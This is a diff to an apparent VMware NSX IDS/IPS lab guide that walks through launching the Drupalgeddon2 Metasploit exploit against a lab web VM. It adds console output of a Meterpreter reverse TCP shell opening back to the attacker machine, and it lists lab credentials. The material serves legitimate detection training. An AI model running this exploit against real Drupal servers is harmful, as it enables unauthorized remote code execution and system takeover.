@@ -398,7 +398,47 @@ You have now successfully configured the NSX Distributed IDS/IPS ! In the next e
     * Username **vmware*
     * Password **VMware1!**
 2. **Alternatively**, if your computer does not have access to the **External VM** directly, you can access the VM console from the  physical environment vCenter Web-UI.  
-3. In order to launch the **Drupalgeddon2** exploit against the **App1-WEB-TIER VM**, you can either manually configure the **Metasploit** module, or edit and run a pre-defined script. If you want to run the attack manually, skip to step #5. If you want to go with the script option, run **sudo nano attack1.rc** and type **VMware1!** when asked for the password. Confirm that the **RHOST** line IP address matches with the IP address of **App1-WEB-TIER VM** you saw in the NSX VM Inventory. Change this IP address if needed, save your changes and exit **nano**
+3. In order to launch the **Drupalgeddon2** exploit against the **App1-WEB-TIER VM**, you can either manually configure the **Metasploit** module, or edit and run a pre-defined script. 
+    * If you want to run the attack manually, skip to step #5. 
+    * If you want to go with the script option, run **sudo nano attack1.rc** and type **VMware1!** when asked for the password. 
+    * Confirm that the **RHOST** line IP address matches with the IP address of **App1-WEB-TIER VM** you saw in the NSX VM Inventory. 
+    * Change this IP address if needed. 
+    * Save your changes and exit **nano**
 4. Type **./attack1.sh** to initiate the Metasploit script and Drupalgeddon exploit. Next, go to step #6
-5  **Alternatively**, 
+5.  **Alternatively**, to run the attack manually, type **msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit.
+
+6. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
+
+vmware@ubuntu:~$ ./attack1.sh
+
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v5.0.95-dev                          ]
++ -- --=[ 2038 exploits - 1103 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it wit                        h setg RHOSTS x.x.x.x
+
+[*] Processing attack1.rc for ERB directives.
+resource (attack1.rc)> use exploit/unix/webapp/drupal_drupalgeddon2
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+resource (attack1.rc)> set RHOST 192.168.10.100
+RHOST => 192.168.10.100
+resource (attack1.rc)> set RPORT 8080
+RPORT => 8080
+resource (attack1.rc)> exploit
+[*] Started reverse TCP handler on 10.114.209.151:4444
+[*] Sending stage (38288 bytes) to 192.168.10.100
+[*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.100:45032) a                        t 2020-07-20 19:37:29 -0500
+
+
 
